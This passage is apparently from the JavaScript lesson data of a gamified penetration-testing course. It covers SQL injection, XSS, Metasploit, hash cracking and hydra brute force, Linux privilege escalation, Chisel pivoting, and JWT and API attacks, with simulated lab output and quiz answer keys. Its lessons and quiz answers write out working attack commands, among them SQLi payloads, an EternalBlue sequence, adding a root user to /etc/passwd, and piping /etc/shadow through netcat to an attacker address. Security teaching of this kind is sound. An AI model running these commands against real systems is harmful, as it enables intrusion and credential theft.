+            {hint:"Use UNION SELECT to extract usernames and passwords from the users table.",accept:["~UNION SELECT","~union select"],output:"' UNION SELECT username,password,email FROM users--\n\n| username | password_hash              | email              |\n|----------|----------------------------|--------------------|  \n| admin    | 5f4dcc3b5aa765d61d8327deb  | admin@megacorp.com |\n| jsmith   | e99a18c428cb38d5f260853678  | john@megacorp.com  |\n| backup   | 21232f297a57a5a743894a0e4a  | backup@megacorp.com|\n\n[+] Credentials extracted!",successMsg:"You dumped the user table! Those hashes can be cracked.",example:"' UNION SELECT username,password,email FROM users--",quickCmds:["' UNION SELECT username,password,email FROM users--"]},
+            {hint:"Let's automate this properly. Use sqlmap to dump everything.",accept:["sqlmap","~sqlmap"],output:"$ sqlmap -u 'http://10.10.10.99/login.php' --data='user=admin&pass=test' --dbs\n\navailable databases:\n[*] megacorp_db\n[*] information_schema\n[*] mysql\n\n$ sqlmap --dump -D megacorp_db -T users\n\n[3 entries]\n+--------+------------------+-------------------------------+\n| admin  | admin@megacorp   | 5f4dcc3b... (cracked: password)|\n| jsmith | john@megacorp    | e99a18c4... (cracked: abc123) |\n| backup | backup@megacorp  | 21232f29... (cracked: admin)  |\n+--------+------------------+-------------------------------+\n\n[+] All credentials cracked. Report this critical finding!",successMsg:"Complete compromise via SQL injection!",example:"sqlmap -u 'http://target/login.php' --dbs",quickCmds:["sqlmap"]},
+          ]},
+      ]},
+      {id:"u6l6",title:"Mastery Test: Web Attacks",rounds:[
+        {type:"type",q:"First character to test for SQL injection:",a:["'","single quote"],why:"Single quote breaks SQL string syntax."},
+        {type:"type",q:"SQLi payload to bypass a login form:",a:["admin'--","' OR 1=1--","admin' OR 1=1--","' or 1=1--","admin'-- "],why:"These payloads manipulate the SQL WHERE clause."},
+        {type:"type",q:"Basic XSS test payload:",a:["<script>alert(1)</script>","<script>alert('XSS')</script>","<img src=x onerror=alert(1)>"],why:"If it executes, the site doesn't sanitize input."},
+        {type:"type",q:"Command injection: read /etc/passwd through a ping form:",a:["; cat /etc/passwd","127.0.0.1; cat /etc/passwd","| cat /etc/passwd"],why:"Semicolon separates commands for the shell."},
+        {type:"type",q:"LFI: traverse directories to read /etc/passwd:",a:["../../../../etc/passwd","../../../etc/passwd","....//....//etc/passwd"],why:"../ moves up directory levels."},
+        {type:"type",q:"What vulnerability: changing /user/123 to /user/124 shows another person's data:",a:["idor","IDOR","insecure direct object reference"],why:"IDOR = accessing objects by changing direct references."},
+        {type:"type",q:"SSRF target URL to access AWS metadata:",a:["http://169.254.169.254","169.254.169.254","http://169.254.169.254/latest/meta-data","http://169.254.169.254/latest/meta-data/"],why:"AWS metadata endpoint reveals instance credentials and config."},
+        {type:"type",q:"Automate SQL injection testing with what tool?",a:["sqlmap"],why:"sqlmap automates detection and exploitation of SQLi."}
+      ]}
+    ]
+  },
+  {
+    id:"u7", title:"Exploitation Tools", desc:"Metasploit, password cracking, and Burp Suite",
+    levels:[
+      {id:"u7l1",title:"Metasploit Framework",rounds:[
+        {type:"teach",text:"Metasploit is your weapon vault — the world's biggest collection of pre-built hacking tools. Exploits = the weapon (triggers the vulnerability). Payloads = what you plant inside after (like a spy or backdoor). Think of it as: the exploit kicks the door down, the payload is the spy you sneak in through the open door. Start with: msfconsole"},
+        {type:"teach",text:"Workflow: search for an exploit → use it → set options (RHOSTS=target, LHOST=your IP) → set a payload → exploit. Example:\nmsfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.5\nset LHOST 10.10.14.3\nexploit"},
+        {type:"order",q:"Order the Metasploit workflow:",items:["search for exploit","use exploit module","set RHOSTS (target)","set LHOST (your IP)","run exploit"],why:"You must select, configure, and then fire the exploit."},
+        {type:"type",q:"Search for EternalBlue in Metasploit:",a:["search eternalblue","search ms17-010","search ms17_010"],why:"search finds relevant modules in Metasploit's database."},
+        {type:"teach",text:"Common payloads: windows/meterpreter/reverse_tcp (advanced Windows shell), linux/x64/shell_reverse_tcp (Linux reverse shell), windows/shell_reverse_tcp (basic Windows shell). Meterpreter gives you upload/download, screenshot, keylog, pivot capabilities."},
+        {type:"build",q:"Build the commands to exploit EternalBlue:",parts:["use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 10.10.10.5","set LHOST 10.10.14.3","exploit"],answer:["use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 10.10.10.5","set LHOST 10.10.14.3","exploit"],why:"Select module → set target → set your IP → fire."},
+        {type:"pick",q:"What does LHOST mean in Metasploit?",opts:["Your (local/attacker) IP","The target IP","The listening port","The exploit name"],a:"Your (local/attacker) IP",why:"LHOST = Local Host = your machine's IP where the reverse shell connects back to."}
+      ]},
+      {id:"u7l2",title:"Password Attacks",rounds:[
+        {type:"teach",text:"Password hashes: Systems don't store passwords in plaintext — they store hashes (one-way mathematical transformations). Common types: MD5 (32 hex chars, weak), SHA-256 (64 hex chars), bcrypt ($2b$...), NTLM (Windows). If you get a hash, you crack it to find the password."},
+        {type:"teach",text:"Cracking tools: hashcat and john (John the Ripper). hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt cracks MD5 with a wordlist. john --wordlist=rockyou.txt hash.txt auto-detects hash type. rockyou.txt is the most famous password wordlist (14 million passwords)."},
+        {type:"type",q:"Crack an MD5 hash using hashcat with rockyou.txt:",a:["hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt","hashcat -m 0 hash.txt rockyou.txt"],why:"-m 0 = MD5 mode. hashcat tries every password in the wordlist."},
+        {type:"teach",text:"Online brute forcing: hydra tries passwords against live services. hydra -l admin -P rockyou.txt ssh://10.10.10.5 brute-forces SSH. Works on SSH, FTP, HTTP forms, RDP, SMB, and more. -l = username, -P = password list."},
+        {type:"build",q:"Build a hydra command to brute force FTP with user 'admin':",parts:["hydra","-l admin","-P","/usr/share/wordlists/rockyou.txt","ftp://10.10.10.5"],answer:["hydra","-l admin","-P","/usr/share/wordlists/rockyou.txt","ftp://10.10.10.5"],why:"hydra tries each password from the list against the FTP service."},
+        {type:"match",q:"Match hash types to their format:",pairs:[["MD5","32 hex characters"],["bcrypt","Starts with $2b$"],["NTLM","32 hex (Windows)"],["SHA-256","64 hex characters"]],why:"Identifying the hash type tells you which cracking mode to use."},
+        {type:"type",q:"Brute force SSH login for user 'root' on the target:",a:["hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5","hydra -l root -P rockyou.txt ssh://10.10.10.5"],why:"hydra -l sets username, -P sets password list, then the service URL."}
+      ]},
+      {id:"u7l3",title:"Burp Suite",rounds:[
+        {type:"teach",text:"Burp Suite is a web proxy that sits between your browser and the target. It intercepts every HTTP request so you can view, modify, and replay them. Set your browser proxy to 127.0.0.1:8080, then every request flows through Burp."},
+        {type:"teach",text:"Key tabs: Proxy (intercept/forward requests), Repeater (modify and resend requests), Intruder (automate attacks — brute force, fuzzing), Decoder (encode/decode base64, URL, hex), Scanner (automated vulnerability scanning — Pro version)."},
+        {type:"match",q:"Match Burp Suite tabs to functions:",pairs:[["Proxy","Intercept requests"],["Repeater","Modify and resend"],["Intruder","Automated attacks/fuzzing"],["Decoder","Encode/decode data"]],why:"Each tab has a specific role in web testing."},
+        {type:"teach",text:"Workflow: 1) Turn on Intercept in Proxy tab. 2) Do an action in browser (login, search). 3) Burp captures the request. 4) Send to Repeater (Ctrl+R) to test manually, or Intruder (Ctrl+I) to automate. 5) Modify parameters and observe responses."},
+        {type:"order",q:"Order the Burp Suite workflow:",items:["Set browser proxy to 127.0.0.1:8080","Enable Intercept","Perform action in browser","Send captured request to Repeater","Modify parameters and analyze response"],why:"This is the standard Burp workflow for manual web testing."},
+        {type:"pick",q:"Burp Intruder is best for:",opts:["Automated fuzzing and brute forcing","Reading source code","Scanning networks","Cracking hashes"],a:"Automated fuzzing and brute forcing",why:"Intruder lets you mark positions in a request and cycle through payloads automatically."}
+      ]},
+      {id:"u7l4",title:"Mastery Test: Exploitation Tools",rounds:[
+        {type:"type",q:"Start Metasploit:",a:["msfconsole"],why:"msfconsole launches the Metasploit Framework console."},
+        {type:"type",q:"In Metasploit, what does RHOSTS mean?",a:["remote host","target ip","target","remote hosts","the target"],why:"RHOSTS = Remote Hosts = the target IP/range you're attacking."},
+        {type:"type",q:"Crack MD5 hashes with hashcat using rockyou.txt:",a:["hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt","hashcat -m 0 hash.txt rockyou.txt"],why:"-m 0 is MD5 mode."},
+        {type:"type",q:"Brute force SSH as user admin on 10.10.10.5:",a:["hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5","hydra -l admin -P rockyou.txt ssh://10.10.10.5"],why:"hydra automates online password attacks."},
+        {type:"type",q:"What Burp Suite tab lets you modify and resend requests?",a:["repeater","Repeater"],why:"Repeater is for manual request modification and analysis."},
+        {type:"type",q:"What port does Burp Suite proxy listen on by default?",a:["8080"],why:"Burp's default proxy is 127.0.0.1:8080."},
+        {type:"order",q:"Metasploit workflow:",items:["search for exploit","use module","set RHOSTS","set LHOST","exploit"],why:"Find → select → configure → fire."}
+      ]}
+    ]
+  }
+];
+
+// UNITS 8-10: Post-Exploitation, Advanced Web, Bug Bounty Ready
+const UNITS_8_10 = [
+  {
+    id:"u8", title:"Post-Exploitation", desc:"Privilege escalation, pivoting with Chisel, and data exfiltration",
+    levels:[
+      {id:"u8l1",title:"Linux Privilege Escalation Basics",rounds:[
+        {type:"teach",text:"After getting a shell on a target, you're usually a low-privilege user. Privilege escalation (privesc) means getting root. First step: enumerate. Run whoami, id, uname -a, sudo -l. sudo -l shows what commands you can run as root — sometimes it's your ticket."},
+        {type:"type",q:"Check what commands the current user can run as root:",a:["sudo -l","sudo -ll"],why:"sudo -l lists your sudo privileges — if you can run /bin/bash as root, game over."},
+        {type:"teach",text:"Common Linux privesc vectors: SUID binaries (find / -perm -4000), writable /etc/passwd or /etc/shadow, kernel exploits (uname -a to find version), cron jobs running as root, misconfigured services, writable scripts in PATH."},
+        {type:"teach",text:"SUID exploitation: If find has SUID, run: find . -exec /bin/sh -p \\; — drops you into a root shell. If vim has SUID: vim -c ':!sh'. If python has SUID: python -c 'import os; os.system(\"/bin/sh\")'. Check GTFOBins.github.io for every SUID bypass."},
+        {type:"type",q:"Find all SUID binaries on the target:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null","find / -perm -u=s"],why:"SUID binaries run as their owner — if owned by root, they're privesc targets."},
+        {type:"pick",q:"GTFOBins is a resource for:",opts:["Finding ways to exploit SUID/sudo binaries","Downloading exploits","Scanning networks","Cracking passwords"],a:"Finding ways to exploit SUID/sudo binaries",why:"GTFOBins lists how to abuse Linux binaries for privilege escalation."},
+        {type:"teach",text:"Automated enumeration: LinPEAS (linpeas.sh) scans the system and highlights privesc vectors in color. Upload it: wget http://YOUR_IP/linpeas.sh, chmod +x linpeas.sh, ./linpeas.sh. It checks everything — SUID, crons, passwords, kernel, configs."},
+        {type:"type",q:"Run LinPEAS on the target:",a:["./linpeas.sh","bash linpeas.sh","sh linpeas.sh","chmod +x linpeas.sh && ./linpeas.sh"],why:"LinPEAS automates privilege escalation enumeration."}
+      ]},
+      {id:"u8l2",title:"Advanced PrivEsc Techniques",rounds:[
+        {type:"teach",text:"Kernel exploits: Check kernel version with uname -a. Search for exploits: searchsploit linux kernel 5.4. Dirty COW, PwnKit, DirtyPipe are famous kernel privesc exploits. Compile on your machine, transfer to target, run."},
+        {type:"type",q:"Check the target's kernel version:",a:["uname -a","uname -r","cat /proc/version"],why:"Kernel version tells you which kernel exploits might work."},
+        {type:"teach",text:"Cron jobs: cat /etc/crontab shows scheduled tasks. If a cron runs a script as root and you can edit that script — inject a reverse shell. Check: /etc/cron.d/, /var/spool/cron/, crontab -l. Also check if any script in a cron uses a writable PATH directory."},
+        {type:"type",q:"View scheduled cron jobs:",a:["cat /etc/crontab","crontab -l","ls /etc/cron.d/"],why:"Cron jobs running as root that reference writable files = privesc."},
+        {type:"teach",text:"Capabilities: Similar to SUID but more granular. getcap -r / 2>/dev/null lists binaries with capabilities. If python3 has cap_setuid, you can change your UID to 0 (root). If tar has cap_dac_read_search, you can read any file."},
+        {type:"type",q:"Find binaries with special capabilities:",a:["getcap -r / 2>/dev/null","getcap -r /"],why:"Capabilities are like mini-SUID permissions — they can be exploited similarly."},
+        {type:"teach",text:"Writable /etc/passwd: If you can write to /etc/passwd, you can add a root user. Generate a password hash: openssl passwd -1 mypassword. Then append: echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd. Login as 'hacker' with root privileges."},
+        {type:"tf",q:"If you can write to /etc/passwd, you can create a new root user.",a:true,why:"Adding a user with UID 0 in /etc/passwd gives them root privileges."}
+      ]},
+      {id:"u8l3",title:"Pivoting with Chisel",rounds:[
+        {type:"teach",text:"Pivoting: After compromising one machine, you use it to access other machines on internal networks you can't reach directly. Machine A (you) → Machine B (compromised, has internal network access) → Machine C (internal target). Chisel creates tunnels for this."},
+        {type:"teach",text:"Chisel setup: On your machine (attacker), run as server: chisel server --reverse -p 9999. On the compromised machine (client): chisel client YOUR_IP:9999 R:8888:INTERNAL_TARGET:80. Now traffic to your localhost:8888 reaches the internal target's port 80."},
+        {type:"order",q:"Order the Chisel pivoting setup:",items:["Start chisel server on attacker machine","Upload chisel to compromised machine","Run chisel client pointing back to your server","Access internal target through local port"],why:"Server on attacker → client on victim → tunnel established."},
+        {type:"build",q:"Build: chisel client to tunnel internal 10.10.10.20:22 through your server at 10.10.14.3:9999:",parts:["chisel client","10.10.14.3:9999","R:2222:10.10.10.20:22"],answer:["chisel client","10.10.14.3:9999","R:2222:10.10.10.20:22"],why:"This lets you SSH to localhost:2222 on your machine, which tunnels to 10.10.10.20:22 through the compromised host."},
+        {type:"teach",text:"SOCKS proxy with Chisel: chisel client YOUR_IP:9999 R:socks creates a SOCKS5 proxy. Configure proxychains to use socks5 127.0.0.1:1080. Then: proxychains nmap 10.10.10.0/24 — your scan traffic routes through the compromised machine."},
+        {type:"type",q:"Create a SOCKS proxy tunnel with chisel client:",a:["chisel client YOUR_IP:9999 R:socks","chisel client 10.10.14.3:9999 R:socks"],why:"R:socks creates a SOCKS5 proxy for routing all traffic through the tunnel."}
+      ]},
+      {id:"u8l4",title:"Data Exfiltration",rounds:[
+        {type:"teach",text:"Once you have access, you may need to extract data (with permission — this is part of demonstrating impact). Methods: scp user@target:/etc/shadow . (copy over SSH), nc (netcat) listeners, base64 encoding + copy-paste, HTTP upload to your server."},
+        {type:"teach",text:"Netcat file transfer: On your machine: nc -lvp 4444 > loot.txt (listen and save). On target: cat /etc/shadow | nc YOUR_IP 4444 (send file). Simple, works almost everywhere."},
+        {type:"build",q:"Build a netcat listener to receive a file:",parts:["nc","-lvp","4444",">","loot.txt"],answer:["nc","-lvp","4444",">","loot.txt"],why:"-l listen, -v verbose, -p port. > redirects received data into a file."},
+        {type:"teach",text:"Covering tracks (for understanding, not for doing illegal things): Check /var/log/auth.log (SSH logins), /var/log/apache2/access.log (web requests), ~/.bash_history (your commands). In a real pentest you DON'T cover tracks — you document everything for the report."},
+        {type:"tf",q:"In a professional pentest, you should cover your tracks to stay hidden.",a:false,why:"In ethical pentesting, you DOCUMENT everything — logs are evidence for your report. Covering tracks is only for red team exercises if specifically agreed upon."}
+      ]},
+      {id:"u8lab",title:"LAB: Root the Box",rounds:[
+        {type:"lab",title:"Privilege Escalation",objective:"You have a low-privilege shell on a server. Find a way to escalate to root.",
+          banner:"=== Privilege Escalation Lab ===\nYou exploited a web vuln and got a shell as www-data.\nNow escalate to root.\n$ whoami\nwww-data\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
+          steps:[
+            {hint:"Check what you can run with sudo.",accept:["sudo -l"],output:"User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find\n\n[!] You can run 'find' as root with no password!",successMsg:"find has sudo NOPASSWD \u2014 check GTFOBins!",example:"sudo -l",quickCmds:["sudo -l","whoami","id"]},
+            {hint:"Also check for SUID binaries as a backup vector.",accept:["find / -perm -4000","~find / -perm -4000","~perm -4000"],output:"/usr/bin/find\n/usr/bin/python3\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/mount\n\n[!] python3 has SUID bit set too!",successMsg:"Two vectors: sudo find AND SUID python3!",example:"find / -perm -4000 2>/dev/null",quickCmds:["find / -perm -4000 2>/dev/null"]},
+            {hint:"Let's use the sudo find trick from GTFOBins to get a root shell.",accept:["sudo find . -exec /bin/sh \\;","~sudo find","sudo find . -exec /bin/bash \\;","~sudo find . -exec","sudo find / -exec /bin/sh -p \\;"],output:"# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\n[+] ROOT SHELL OBTAINED!",successMsg:"You're root! sudo find -exec spawns a shell as root.",example:"sudo find . -exec /bin/sh \\;",quickCmds:["sudo find . -exec /bin/sh \\;"]},
+            {hint:"Grab the root flag to prove compromise.",accept:["cat /root/root.txt","~cat /root/","ls /root"],output:"FLAG{pr1v_3sc_v1a_sud0_f1nd}\n\n[+] Root flag captured!\n[+] You escalated from www-data to root using sudo misconfiguration.\n[+] Remediation: Remove NOPASSWD from find in sudoers file.",successMsg:"Box rooted! Full compromise demonstrated.",example:"cat /root/root.txt",quickCmds:["cat /root/root.txt","cat /root/flag.txt"]},
+          ]},
+      ]},
+      {id:"u8l5",title:"Mastery Test: Post-Exploitation",rounds:[
+        {type:"type",q:"Check what you can run as root:",a:["sudo -l"],why:"sudo -l shows your sudo privileges."},
+        {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],why:"SUID files run as their owner."},
+        {type:"type",q:"Check kernel version for exploit research:",a:["uname -a","uname -r","cat /proc/version"],why:"Kernel version determines which exploits apply."},
+        {type:"type",q:"View cron jobs for privesc opportunities:",a:["cat /etc/crontab","crontab -l"],why:"Cron jobs running as root with writable scripts = privesc."},
+        {type:"type",q:"Start a chisel server on port 9999:",a:["chisel server --reverse -p 9999","chisel server -p 9999 --reverse","./chisel server --reverse -p 9999"],why:"The server runs on YOUR machine."},
+        {type:"type",q:"Set up a netcat listener on port 4444 to receive data:",a:["nc -lvp 4444","nc -lvnp 4444","nc -nlvp 4444"],why:"nc -lvp sets up a listening socket."},
+        {type:"type",q:"What automated tool enumerates Linux privesc vectors?",a:["linpeas","LinPEAS","linpeas.sh"],why:"LinPEAS checks SUID, crons, capabilities, passwords, kernel, and more."},
+        {type:"type",q:"Find binaries with capabilities:",a:["getcap -r / 2>/dev/null","getcap -r /"],why:"Capabilities grant specific root-like powers to individual binaries."}
+      ]}
+    ]
+  },
+  {
+    id:"u9", title:"Advanced Web", desc:"JWT attacks, API hacking, and authentication bypass",
+    levels:[
+      {id:"u9l1",title:"JWT Attacks",rounds:[
+        {type:"teach",text:"JWT (JSON Web Token) is used for authentication. Format: header.payload.signature (base64 encoded, separated by dots). The header specifies the algorithm (HS256, RS256). The payload contains claims (user, role, exp). The signature verifies integrity."},
+        {type:"teach",text:"JWT attacks: 1) Change alg to 'none' — some libraries skip verification. 2) Brute force the HS256 secret key — if it's weak (like 'secret'), you can forge tokens. 3) RS256→HS256 confusion — trick the server into using the public key as HMAC secret."},
+        {type:"pick",q:"What happens if you change a JWT's algorithm to 'none'?",opts:["Some servers skip signature verification","The token expires immediately","The server crashes","Nothing"],a:"Some servers skip signature verification",why:"The 'none' algorithm attack works if the library accepts unsigned tokens."},
+        {type:"teach",text:"Tools: jwt_tool automates JWT attacks. jwt.io lets you decode/edit tokens in a browser. To crack weak secrets: hashcat -m 16500 jwt.txt wordlist.txt"},
+        {type:"type",q:"Decode and crack a JWT secret with hashcat:",a:["hashcat -m 16500 jwt.txt wordlist.txt","hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"],why:"-m 16500 is the JWT hash mode in hashcat."},
+        {type:"tf",q:"A JWT with a weak signing secret can be forged by an attacker.",a:true,why:"If you crack the secret, you can modify the payload (change role to admin) and re-sign it."}
+      ]},
+      {id:"u9l2",title:"API Hacking",rounds:[
+        {type:"teach",text:"APIs (Application Programming Interfaces) are how apps communicate. REST APIs use HTTP methods: GET /api/users (list users), POST /api/users (create user), PUT /api/users/1 (update user 1), DELETE /api/users/1 (delete user 1). APIs are often less secured than web UIs."},
+        {type:"teach",text:"API recon: Check /api, /api/v1, /api/docs, /swagger, /openapi.json for documentation. Try different HTTP methods on endpoints. Add headers like X-Forwarded-For: 127.0.0.1 to bypass IP restrictions. Test rate limiting by sending many requests."},
+        {type:"type",q:"Where might you find API documentation on a target?",a:["/api/docs","/swagger","/openapi.json","/api/v1/docs","/swagger-ui.html"],why:"Swagger/OpenAPI docs reveal all endpoints, parameters, and auth requirements."},
+        {type:"teach",text:"API attacks: BOLA (Broken Object Level Authorization) = IDOR for APIs. Mass assignment: POST with extra fields (isAdmin:true) that the server blindly accepts. Rate limit bypass: rotate IPs/headers. Excessive data exposure: API returns more fields than the UI shows."},
+        {type:"pick",q:"You send POST /api/user with {name:'test', isAdmin:true} and it works. What vulnerability?",opts:["Mass assignment","SQL injection","XSS","CSRF"],a:"Mass assignment",why:"Mass assignment = the server accepts fields it shouldn't, like isAdmin or role."},
+        {type:"tf",q:"APIs often return more data than the frontend displays to the user.",a:true,why:"Excessive data exposure — the API might return password hashes, internal IDs, or admin flags that the UI hides."}
+      ]},
+      {id:"u9l3",title:"Auth Bypass Techniques",rounds:[
+        {type:"teach",text:"Authentication bypass methods: Default credentials (admin:admin, admin:password), credential stuffing (leaked passwords from data breaches), password reset flaws (predictable tokens, email parameter manipulation), 2FA bypass (response manipulation, backup codes)."},
+        {type:"teach",text:"Session attacks: Session fixation (force a known session ID on victim), session hijacking (steal cookie via XSS), session puzzling (reuse session vars between different features). Always test: can you access /admin by just browsing to it directly?"},
+        {type:"pick",q:"You find the admin panel at /admin has no login check — you just go to the URL and you're in. What is this?",opts:["Broken access control","SQL injection","XSS","CSRF"],a:"Broken access control",why:"The server should verify authentication and authorization on every request, not just rely on the UI to hide links."},
+        {type:"teach",text:"Response manipulation: Sometimes the auth check is client-side. Intercept the login response in Burp. Change {\"success\":false} to {\"success\":true} or {\"role\":\"user\"} to {\"role\":\"admin\"}. If the app trusts the response without server-side verification, you're in."},
+        {type:"tf",q:"Some applications perform authorization checks only on the client side.",a:true,why:"Client-side auth is easily bypassed by modifying HTTP responses in Burp Suite."}
+      ]},
+      {id:"u9l4",title:"Mastery Test: Advanced Web",rounds:[
+        {type:"type",q:"What are the 3 parts of a JWT (separated by dots)?",a:["header.payload.signature","header payload signature","header, payload, signature"],why:"header.payload.signature — each base64 encoded."},
+        {type:"type",q:"Crack a JWT secret with hashcat (what -m mode)?",a:["16500","-m 16500","hashcat -m 16500"],why:"16500 is hashcat's JWT mode."},
+        {type:"type",q:"Where do you find API documentation?",a:["/swagger","/api/docs","/openapi.json","/swagger-ui.html"],why:"Swagger/OpenAPI endpoints reveal full API structure."},
+        {type:"type",q:"Sending {isAdmin:true} in a POST and the server accepts it is called?",a:["mass assignment","mass-assignment"],why:"Mass assignment = server blindly binds all submitted fields to the data model."},
+        {type:"type",q:"Intercepting a response and changing success:false to success:true in Burp is what kind of attack?",a:["response manipulation","auth bypass","authentication bypass","client-side bypass"],why:"If the app trusts the response without server-side checks, this bypasses auth."},
+        {type:"tf",q:"JWT tokens with algorithm 'none' are always rejected by servers.",a:false,why:"Some misconfigured libraries accept alg:none and skip signature verification."}
+      ]}
+    ]
+  },
+  {
+    id:"u10", title:"Bug Bounty Ready", desc:"Recon automation, methodology, writing reports, and final challenge",
+    levels:[
+      {id:"u10l1",title:"Recon Automation",rounds:[
+        {type:"teach",text:"Bug bounty recon at scale uses tool chains: subfinder (finds subdomains), httpx (probes which are alive), nuclei (scans for vulnerabilities using templates). Chain: subfinder -d target.com | httpx | nuclei — finds subdomains, checks which respond, then scans them all."},
+        {type:"type",q:"Find subdomains of target.com:",a:["subfinder -d target.com","amass enum -d target.com","sublist3r -d target.com"],why:"subfinder passively discovers subdomains from public sources."},
+        {type:"build",q:"Build the full recon chain: subdomains → alive check → vulnerability scan:",parts:["subfinder -d target.com","|","httpx","|","nuclei"],answer:["subfinder -d target.com","|","httpx","|","nuclei"],why:"This chain automates the entire external recon process."},
+        {type:"teach",text:"More recon tools: waybackurls (finds old URLs from Wayback Machine), gau (GetAllUrls from multiple sources), ffuf (fast web fuzzer), katana (web crawler). Combine: katana -u target.com | grep '\\.js' (find JavaScript files that might contain API keys, secrets)."},
+        {type:"type",q:"Find historical URLs for target.com:",a:["waybackurls target.com","gau target.com"],why:"Historical URLs reveal old endpoints, parameters, and forgotten features that may still be vulnerable."}
+      ]},
+      {id:"u10l2",title:"Bug Bounty Methodology",rounds:[
+        {type:"teach",text:"Methodology: 1) Read the program scope carefully. 2) Recon (subdomains, ports, tech stack). 3) Map the application (every feature, parameter, endpoint). 4) Test each input for common vulns (SQLi, XSS, IDOR, SSRF). 5) Chain findings for bigger impact. 6) Report clearly."},
+        {type:"order",q:"Order the bug bounty workflow:",items:["Read program scope","Subdomain & port enumeration","Map application features","Test inputs for vulnerabilities","Chain findings for impact","Write clear report"],why:"Following methodology prevents you from missing things."},
+        {type:"teach",text:"What pays well: Critical = RCE, auth bypass, SQL injection with data access ($5K-$50K+). High = stored XSS, SSRF to internal services, IDOR with PII ($1K-$10K). Medium = reflected XSS, info disclosure ($200-$2K). Low = missing headers, verbose errors ($50-$500)."},
+        {type:"match",q:"Match severity to finding:",pairs:[["Critical","Remote Code Execution"],["High","Stored XSS with cookie theft"],["Medium","Reflected XSS"],["Low","Missing security headers"]],why:"Understanding severity helps you prioritize testing and set expectations."},
+        {type:"teach",text:"Platforms: HackerOne, Bugcrowd, Intigriti, and Synack are the major bug bounty platforms. Many companies also run their own programs (Google, Meta, Apple). Start with programs that have large scopes and are 'beginner friendly'."},
+        {type:"pick",q:"Which platform is one of the largest bug bounty platforms?",opts:["HackerOne","LinkedIn","GitHub","StackOverflow"],a:"HackerOne",why:"HackerOne hosts thousands of bug bounty programs."}
+      ]},
+      {id:"u10l3",title:"Writing Reports",rounds:[
+        {type:"teach",text:"A good bug report needs: Title (clear, specific), Severity (critical/high/medium/low), Description (what the vulnerability is), Steps to Reproduce (exact steps anyone can follow), Impact (what an attacker could do), Remediation (how to fix it)."},
+        {type:"order",q:"Order the sections of a bug report:",items:["Title & Severity","Description of vulnerability","Steps to Reproduce","Impact assessment","Remediation recommendation"],why:"This structure makes reports clear and actionable for developers."},
+        {type:"teach",text:"Steps to Reproduce must be EXACT. Bad: 'I found XSS on the search page.' Good: '1. Go to https://target.com/search 2. Enter <script>alert(document.domain)</script> in the search box 3. Click Search 4. Observe JavaScript alert with domain name.' Include screenshots and HTTP requests."},
+        {type:"pick",q:"What makes the difference between a good and bad bug report?",opts:["Clear, reproducible steps","Fancy formatting","Long descriptions","Multiple screenshots"],a:"Clear, reproducible steps",why:"If the team can't reproduce your bug, they can't fix it or pay you."},
+        {type:"teach",text:"Impact statement: Don't just say 'XSS'. Say 'An attacker could steal session cookies of any user who visits the /search page, allowing full account takeover. This affects all 500,000 registered users.' Business impact gets higher bounties."},
+        {type:"tf",q:"Including the business impact of a vulnerability can increase your bounty payout.",a:true,why:"Programs pay based on impact. Explaining real-world consequences demonstrates severity."}
+      ]},
+      {id:"u10l4",title:"Final Boss: Full Chain",rounds:[
+        {type:"teach",text:"Real pentests chain multiple vulnerabilities together. Example: Find subdomain (recon) → discover open port (scanning) → find SQLi on login (web attack) → dump admin creds (exploitation) → SSH in (access) → find SUID binary (privesc) → get root → pivot to internal network (chisel). That's a full chain."},
+        {type:"order",q:"Order this attack chain:",items:["Enumerate subdomains with subfinder","Port scan with nmap -sV","Discover SQLi on login page","Extract admin credentials","SSH into the server","Find SUID binary for privesc","Get root access","Pivot with chisel to internal network"],why:"This represents a realistic full penetration test from recon to internal access."},
+        {type:"type",q:"What's the first thing you check after getting a low-privilege shell?",a:["sudo -l","whoami","id","uname -a"],why:"sudo -l shows if you have any easy privilege escalation paths."},
+        {type:"type",q:"Tool to automate Linux privilege escalation enumeration:",a:["linpeas","LinPEAS","linpeas.sh"],why:"LinPEAS checks everything — SUID, capabilities, crons, kernel, configs."},
+        {type:"type",q:"Create a reverse SOCKS proxy tunnel:",a:["chisel client YOUR_IP:9999 R:socks","chisel client 10.10.14.3:9999 R:socks"],why:"SOCKS proxy lets you route all traffic through the compromised host."},
+        {type:"tf",q:"Chaining low-severity bugs together can result in critical impact.",a:true,why:"A reflected XSS + CSRF + IDOR chain could lead to full account takeover — critical impact from medium/low bugs."}
+      ]},
+      {id:"u10lab",title:"LAB: Bug Bounty Hunt",rounds:[
+        {type:"lab",title:"Find a Real Bug",objective:"You just signed up for MegaCorp's bug bounty. Use your recon skills to find a vulnerability and report it.",
+          banner:"=== MegaCorp Bug Bounty Program ===\nScope: *.megacorp.com\nReward: $500-$50,000\nOut of scope: DoS, social engineering\nGood hunting!\n",
+          steps:[
+            {hint:"Start recon: find subdomains of megacorp.com.",accept:["subfinder -d megacorp.com","~subfinder","amass enum -d megacorp.com","~amass"],output:"[subfinder] Enumerating subdomains for megacorp.com\nwww.megacorp.com\napi.megacorp.com\nstaging.megacorp.com\ndev.megacorp.com\nmail.megacorp.com\nold.megacorp.com\n\n[+] Found 6 subdomains",successMsg:"6 subdomains! staging and dev look interesting.",example:"subfinder -d megacorp.com",quickCmds:["subfinder -d megacorp.com"]},
